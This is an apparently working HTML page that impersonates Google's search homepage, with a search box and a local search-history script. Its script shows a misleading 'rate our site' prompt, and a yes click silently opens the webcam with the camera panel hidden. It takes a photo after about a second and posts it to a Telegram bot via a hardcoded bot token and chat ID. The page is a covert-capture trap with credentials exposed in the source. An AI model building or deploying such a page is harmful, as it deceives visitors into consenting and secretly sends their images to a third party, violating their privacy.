<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Google uslubidagi qidiruv + Kamera â€” Rasmni avtomatik Telegramga yuborish</title>

  <!-- SEO meta -->
  <meta name="description" content="Google uslubidagi oddiy qidiruv interfeysi va kamera tugmasi â€” surat olingan zahoti Telegram bot orqali avtomatik yuborish. Ushbu sahifa Telegram bot integratsiyasiga moslangan va mobilga ham moslashgan." />
  <meta name="keywords" content="qidiruv, google uslubi, kamera, telegram bot, rasm yuborish, image search, Uzbek" />
  <meta name="author" content="Sizning Ismingiz yoki Kompaniya" />
  <link rel="canonical" href="https://sizning-saytingiz.uz/google-style-search-camera" />
  <meta name="robots" content="index, follow" />

  <!-- Open Graph / social -->
  <meta property="og:title" content="Google uslubidagi qidiruv + Kamera â€” Rasmni avtomatik Telegramga yuborish" />
  <meta property="og:description" content="Google uslubidagi qidiruv interfeysi: yozing yoki kamerani bosing â€” olingan rasm Telegram botga avtomatik yuboriladi." />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://sizning-saytingiz.uz/google-style-search-camera" />
  <meta property="og:image" content="https://sizning-saytingiz.uz/assets/google-logo.png" />
  <meta property="og:site_name" content="Sizning Saytingiz" />

  <!-- Twitter card -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Google uslubidagi qidiruv + Kamera â€” Telegramga avtomatik rasm yuborish" />
  <meta name="twitter:description" content="Qidiruv yozing yoki kamerani oching â€” rasm avtomatik Telegram botga yuboriladi." />
  <meta name="twitter:image" content="https://sizning-saytingiz.uz/assets/google-logo.png" />

  <!-- Favicon / title image (placeholder) -->
  <!-- O'zingizning logongizni yoki ruxsat bilan Google logotipini shu faylga joylang -->
  <link rel="icon" href="/assets/google-logo.png" />

</head>
<body>

  <style>
  body {
  font-family: 'Roboto', Arial, sans-serif;
  display: flex;
  flex-direction: column;
  align-items: center;
  margin: 0;
  background: #fff;
}

/* Navbar */
.navbar {
  width: 100%;
  text-align: right;
  padding: 15px 25px;
}
.nav-links {
  display: flex;
  align-items: center;
  gap: 15px;
  justify-content: flex-end;
  flex-wrap: wrap;
}
.nav-links a {
  color: #202124;
  text-decoration: none;
  font-size: 14px;
}
.nav-links a:hover {
  text-decoration: underline;
}
.login-btn {
  background: #1a73e8;
  color: #fff;
  border: none;
  padding: 8px 15px;
  border-radius: 5px;
  cursor: pointer;
  font-weight: 500;
  transition: background 0.2s;
}
.login-btn:hover {
  background: #1669c1;
}

/* Search box */
.container {
  margin-top: 50px;
  text-align: center;
  width: 100%;
  max-width: 900px;
  padding: 0 16px;
}
.logo {
  width: 272px;
  margin-bottom: 20px;
  max-width: 90%;
}
.search-box {
  display: flex;
  align-items: center;
  border: 1px solid #dfe1e5;
  border-radius: 24px;
  width: 580px;
  max-width: 100%;
  padding: 10px 15px;
  margin: 0 auto;
  box-shadow: none;
  transition: all 0.2s ease;
}
.search-box:hover {
  box-shadow: 0 1px 6px rgba(32,33,36,0.28);
}
.search-box input {
  flex: 1;
  border: none;
  outline: none;
  font-size: 16px;
  color: #202124;
}

/* Camera section */
.camera-card {
  margin-top: 30px;
  display: flex;
  gap: 20px;
  align-items: flex-start;
  justify-content: center;
  flex-wrap: wrap;
  display: none;
}
.cam-box {
  background: #f8f9fa;
  padding: 12px;
  border-radius: 8px;
  box-shadow: 0 4px 10px rgba(0,0,0,0.08);
  width: 360px;
  max-width: 100%;
}
video, canvas {
  width: 100%;
  border-radius: 6px;
  background: #000;
  display: block;
}
.status {
  margin-top: 10px;
  padding: 8px;
  border-radius: 4px;
  font-size: 14px;
}
.status.success { background-color: #e6f4ea; color: #137333; }
.status.error { background-color: #fce8e6; color: #c5221f; }
.status.info { background-color: #e8f0fe; color: #1a73e8; }

/* Modal (Google style) */
.permission-modal {
  position: fixed;
  top: 0; left: 0;
  width: 100%; height: 100%;
  background: rgba(32,33,36,0.5);
  display: none;
  justify-content: center;
  align-items: center;
  z-index: 1000;
  animation: fadeIn 0.25s ease;
}
@keyframes fadeIn {
  from {opacity: 0;} to {opacity: 1;}
}
.modal-content {
  background: #fff;
  padding: 30px 25px;
  border-radius: 12px;
  max-width: 400px;
  width: 90%;
  text-align: center;
  box-shadow: 0 8px 24px rgba(0,0,0,0.2);
  animation: slideUp 0.3s ease;
}
@keyframes slideUp {
  from { transform: translateY(40px); opacity: 0; }
  to { transform: translateY(0); opacity: 1; }
}
.modal-content h2 {
  color: #202124;
  font-size: 18px;
  font-weight: 500;
  margin: 0 0 15px 0;
}
.modal-text {
  color: #5f6368;
  font-size: 14px;
  margin-bottom: 20px;
  line-height: 1.5;
}
.modal-buttons {
  display: flex;
  gap: 10px;
  justify-content: center;
  flex-wrap: wrap;
}
.allow-btn {
  background: #1a73e8;
  color: white;
  border: none;
  padding: 10px 24px;
  border-radius: 24px;
  cursor: pointer;
  font-weight: 500;
  transition: background 0.2s ease;
}
.allow-btn:hover { background: #1669c1; }
.deny-btn {
  background: #f1f3f4;
  color: #3c4043;
  border: none;
  padding: 10px 24px;
  border-radius: 24px;
  cursor: pointer;
  font-weight: 500;
  transition: background 0.2s ease;
}
.deny-btn:hover { background: #e8eaed; }

/* RESPONSIVE DESIGN */
@media (max-width: 768px) {
  .search-box {
    width: 90%;
    padding: 8px 12px;
  }

  .camera-card {
    flex-direction: column;
    align-items: center;
  }

  .cam-box {
    width: 90%;
  }

  .nav-links {
    justify-content: center;
  }

  .logo {
    width: 220px;
  }
}

@media (max-width: 480px) {
  .navbar {
    padding: 10px 15px;
  }

  .nav-links {
    flex-direction: column;
    gap: 8px;
    text-align: center;

    display: none;
  
  }


  .body {
  width: 90;
    padding: 0 10px;
    margin: 0 auto;
  }
  .login-btn {
    width: 100%;
  }

  .logo {
    width: 180px;
  }

  .modal-content {
    width: 80%;
    padding: 20px;
  }

  .allow-btn, .deny-btn {
    width: 100%;
  }
}

</style>
  <div class="navbar">
    <div class="nav-links">
      <a href="#">Gmail</a>
      <a href="#">Rasmlar</a>
      <button class="login-btn">Kirish</button>
    </div>
  </div>

  <div class="container">
    <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="logo">

   <!-- Qidiruv qutisi + uslub + script - shu blokni o'zingiz xohlagan joyga joylang -->
<div class="search-box">
  <div class="search-inner">
    <input id="searchInput" type="text" placeholder="Qidiruv..." autocomplete="off" />
    <button id="clearBtn" title="Tozalash">&times;</button>
  </div>

  <!-- Takliflar oynasi -->
  <div id="suggestions" class="suggestions" aria-hidden="true">
    <div class="suggest-section" id="recentSection">
      <div class="section-title">
        Soâ€˜nggi izlashlar
        <button id="clearHistory" class="clear-history" title="Barchasini oâ€˜chirish">Tozalash</button>
      </div>
      <div id="recentList" class="chips"></div>
    </div>

    <div class="suggest-section" id="matchSection">
      <div class="section-title">Oâ€˜xshash takliflar</div>
      <ul id="matches" class="matches"></ul>
    </div>
  </div>
</div>

<style>
/* --- Oson, zamonaviy va responsiv styling --- */
.search-box { position: relative; width: 100%; max-width: 520px; margin: 0 auto; font-family: Arial, sans-serif; }
/* .search-inner { display:flex; align-items:center; gap:8px; background: #fff; border: 1px solid #e0e0e0; padding: 8px 10px; border-radius: 24px; box-shadow: 0 1px 3px rgba(0,0,0,0.04); } */
#searchInput { flex:1; border:0; outline:0; font-size:16px; padding:6px 4px; }
#clearBtn { background:transparent; border:0; font-size:20px; line-height:1; color:#888; cursor:pointer; display:none; }

.suggestions { position: absolute; left:0; right:0; top: calc(100% + 8px); background:#fff; border:1px solid #e6e6e6; border-radius:10px; box-shadow: 0 6px 20px rgba(0,0,0,0.08); padding:12px; z-index:50; display:none; }
.suggest-section { margin-bottom:8px; }
.section-title { display:flex; justify-content:space-between; align-items:center; font-size:13px; color:#666; margin-bottom:8px; }
.clear-history { background:transparent; border:0; color:#0073e6; cursor:pointer; font-size:13px; padding:2px 6px; }

.chips { display:flex; gap:8px; flex-wrap:wrap; }
.chips .chip { background:#f3f6fb; padding:6px 10px; border-radius:999px; cursor:pointer; font-size:14px; color:#102a43; border:1px solid rgba(16,42,67,0.06); }
.chips .chip:hover { transform:translateY(-2px); box-shadow: 0 6px 18px rgba(16,42,67,0.06); }

.matches { list-style:none; margin:0; padding:0; max-height:180px; overflow:auto; }
.matches li { padding:8px 10px; border-radius:8px; cursor:pointer; font-size:15px; color:#111; }
.matches li + li { margin-top:6px; }
.matches li:hover, .matches li.active { background:#f4f8ff; }

@media (max-width:520px){
  .search-box { max-width: 80%; }
  .suggestions { top:calc(100% + 6px); padding:10px; }
}
</style>

<script>
/* --- Script: history saqlash, takliflarni filtrlash va UI logikasi --- */
(function(){
  const input = document.getElementById('searchInput');
  const suggestions = document.getElementById('suggestions');
  const recentList = document.getElementById('recentList');
  const matchesList = document.getElementById('matches');
  const clearHistoryBtn = document.getElementById('clearHistory');
  const clearBtn = document.getElementById('clearBtn');

  const STORAGE_KEY = 'searchHistory_v1';
  const MAX_HISTORY = 8;

  // Misol uchun serverdan yoki sizning maxsus ma'lumotlaringizdan keladigan o'xshash so'zlar ro'yxati
  const fallbackSuggestions = [
    'JavaScript darslari', 'HTML formalar', 'CSS flex misollari',
    'React carousel', 'Telegram bot yuklash', 'Responsive header',
    'SCSS mixin', 'No-code platformalar', 'Frontend ish qidirish', 'GitHub repozitoriyalar'
  ];

  // localStorage-dan yuklash
  function loadHistory(){
    try {
      return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
    } catch(e) { return []; }
  }

  function saveHistory(arr){
    localStorage.setItem(STORAGE_KEY, JSON.stringify(arr.slice(0, MAX_HISTORY)));
  }

  function addToHistory(term){
    if(!term) return;
    const trimmed = term.trim();
    if(!trimmed) return;
    let hist = loadHistory();
    // takrorlarni olib tashlash (oxirgi eng birinchi)
    hist = hist.filter(x => x.toLowerCase() !== trimmed.toLowerCase());
    hist.unshift(trimmed);
    saveHistory(hist);
    renderRecent();
  }

  function clearHistory(){
    localStorage.removeItem(STORAGE_KEY);
    renderRecent();
  }

  function renderRecent(){
    const hist = loadHistory();
    recentList.innerHTML = hist.length ? hist.map(h => `<div class="chip" data-val="${escapeHtml(h)}">${escapeHtml(h)}</div>`).join('') : '<div style="color:#999; font-size:14px">Hech narsa yoâ€˜q</div>';
  }

  function renderMatches(filter){
    const normalized = (filter || '').toLowerCase().trim();
    // birinchi navbatda history ichida mos keladiganlarni ko'rsatamiz
    const hist = loadHistory().filter(h => h.toLowerCase().includes(normalized));
    // fallback sugesslarni ham qo'shamiz, history bilan takrorlanmasligi uchun
    const others = fallbackSuggestions.filter(s => s.toLowerCase().includes(normalized) && !hist.some(h=>h.toLowerCase()===s.toLowerCase()));
    const items = normalized ? [...hist, ...others] : [];
    if(items.length === 0 && normalized){
      matchesList.innerHTML = `<li style="color:#777; font-size:14px">Hech nima topilmadi. <strong>"${escapeHtml(filter)}"</strong> uchun yangi qidiruvni saqlash mumkin.</li>`;
    } else {
      matchesList.innerHTML = items.map(it => `<li tabindex="0" class="match-item">${escapeHtml(it)}</li>`).join('');
    }
  }

  // xavfsiz HTML uchun oddiy escapeler
  function escapeHtml(str){
    return String(str).replace(/[&<>"']/g, s => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[s]));
  }

  // UI ko'rsatish / yashirish
  function showSuggestions(){
    suggestions.style.display = 'block';
    suggestions.setAttribute('aria-hidden','false');
  }
  function hideSuggestions(){
    suggestions.style.display = 'none';
    suggestions.setAttribute('aria-hidden','true');
  }

  // Eventlar
  input.addEventListener('focus', () => {
    renderRecent();
    renderMatches('');
    showSuggestions();
    toggleClearBtn();
  });

  input.addEventListener('input', (e) => {
    const v = e.target.value;
    renderMatches(v);
    toggleClearBtn();
    showSuggestions();
  });

  // enter bilan qidiruvni saqlash
  input.addEventListener('keydown', (e) => {
    // simple keyboard nav for matches
    if(e.key === 'Enter'){
      e.preventDefault();
      const val = input.value.trim();
      if(val) {
        addToHistory(val);
        hideSuggestions();
        // agar xohlasangiz shu yerga qidiruvni yuborish funksiyasini chaqiring
        // example: performSearch(val);
      }
    } else if (e.key === 'Escape') {
      hideSuggestions();
      input.blur();
    } else if (e.key === 'ArrowDown') {
      // fokusni birinchi match elementiga o'tkazish
      const first = matchesList.querySelector('.match-item');
      if(first) { first.focus(); }
    }
  });

  // chip bosilganda
  recentList.addEventListener('click', (e) => {
    const chip = e.target.closest('.chip');
    if(!chip) return;
    const v = chip.dataset.val;
    input.value = v;
    input.focus();
    renderMatches(v);
  });

  // match bosilganda yoki Enter bosilganda
  matchesList.addEventListener('click', (e) => {
    const li = e.target.closest('li');
    if(!li) return;
    const v = li.textContent.trim();
    input.value = v;
    addToHistory(v);
    hideSuggestions();
  });

  // klaviatura navigatsiyasi matchs ichida
  matchesList.addEventListener('keydown', (e) => {
    const cur = document.activeElement;
    if(!cur || !cur.classList.contains('match-item')) return;
    if(e.key === 'ArrowDown'){
      e.preventDefault();
      const next = cur.nextElementSibling;
      if(next) next.focus();
    } else if(e.key === 'ArrowUp'){
      e.preventDefault();
      const prev = cur.previousElementSibling;
      if(prev) prev.focus();
      else input.focus();
    } else if(e.key === 'Enter'){
      e.preventDefault();
      const v = cur.textContent.trim();
      input.value = v;
      addToHistory(v);
      hideSuggestions();
    }
  });

  // history tozalash
  clearHistoryBtn.addEventListener('click', (e) => {
    e.preventDefault();
    clearHistory();
  });

  // tashqariga bosilganda panel yopish
  document.addEventListener('click', (e) => {
    if(!document.querySelector('.search-box').contains(e.target)) {
      hideSuggestions();
    }
  });

  // Clear input knopkasi ko'rsatish
  function toggleClearBtn(){
    if(input.value.trim().length) clearBtn.style.display = 'inline';
    else clearBtn.style.display = 'none';
  }
  clearBtn.addEventListener('click', () => {
    input.value = '';
    input.focus();
    renderMatches('');
    toggleClearBtn();
  });

  // boshlang'ich render
  renderRecent();

  // OPTIONAL: demo uchun biroz boshlang'ich tarix qo'yish (faqat agar history bo'sh bo'lsa)
  (function seedDemo(){
    const hist = loadHistory();
    if(hist.length === 0){
      const sample = ['HTML tutorial', 'CSS grid misollari', 'React project', 'Telegram bot yaratish'];
      saveHistory(sample);
      renderRecent();
    }
  })();

})();
</script>


    <div class="camera-card">
      <div class="cam-box">
        <h3>Kamera</h3>
        <video id="video" autoplay playsinline></video>
      </div>

      <div class="cam-box">
        <h3>Surat natijasi</h3>
        <canvas id="canvas"></canvas>
        <div id="status" class="status"></div>
      </div>
    </div>
  </div>

  <!-- Google style modal -->
  <div id="permissionModal" class="permission-modal">
    <div class="modal-content">
      <h2>Saytimizni xozir baxolaysizmi </h2>
     
      <div class="modal-buttons">
        <button id="allowCamera" class="allow-btn">Ha, ruxsat beraman</button>
        <button id="denyCamera" class="allow-btn">Yoâ€˜q</button>
      </div>
    </div>
  </div>

  <script>
  const BOT_TOKEN = '7978359844:AAH_su2pm1WJQZuzSjkNsu8BRo-cemtvKgg'; // agar demo ishlatsangiz, ogohlantirishni biling
    const CHAT_ID = '7412640853'; // bu yerga chat_id qo'ying

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusDiv = document.getElementById('status');
    const permissionModal = document.getElementById('permissionModal');
    const allowCameraBtn = document.getElementById('allowCamera');
    const denyCameraBtn = document.getElementById('denyCamera');

    let stream = null;

    window.addEventListener('load', () => {
      setTimeout(() => permissionModal.style.display = 'flex', 700);
    });

    allowCameraBtn.addEventListener('click', () => {
      permissionModal.style.display = 'none';
      startCamera();
    });

    denyCameraBtn.addEventListener('click', () => {
      permissionModal.style.display = 'none';
      showStatus("Kamera ruxsati rad etildi.", "error");
    });

    async function startCamera() {
      try {
        showStatus("Kamera ochilmoqda...", "info");
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          video.play();
          showStatus("Kamera yoqildi. 3 soniyadan keyin surat olinadi...", "success");
          setTimeout(() => captureAndSend(), 1000);
        };
      } catch (error) {
        console.error(error);
        showStatus("Kamera ochilmadi. Ruxsat berilmagan.", "error");
      }
    }

    async function captureAndSend() {
      if (!video.videoWidth) {
        showStatus("Video tayyor emas. Qayta urinilmoqda...", "info");
        setTimeout(captureAndSend, 1500);
        return;
      }

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL('image/jpeg');
      showStatus("ðŸ“¸ Surat olingan! Telegramâ€™ga yuborilmoqda...", "info");

      stopCamera();

      try {
        const blob = await (await fetch(imageData)).blob();
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        formData.append('caption', 'ðŸ“· Avtomatik olingan surat');

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        const result = await response.json();

        if (result.ok) {
          showStatus("âœ… Surat muvaffaqiyatli yuborildi!", "success");
        } else {
          showStatus("âŒ Xatolik: " + result.description, "error");
        }
      } catch (e) {
        console.error(e);
        showStatus("Yuborishda xatolik yuz berdi.", "error");
      }
    }

    function stopCamera() {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
      }
    }

    function showStatus(message, type) {
      statusDiv.textContent = message;
      statusDiv.className = "status " + type;
    }
  </script>
</body>
</html>
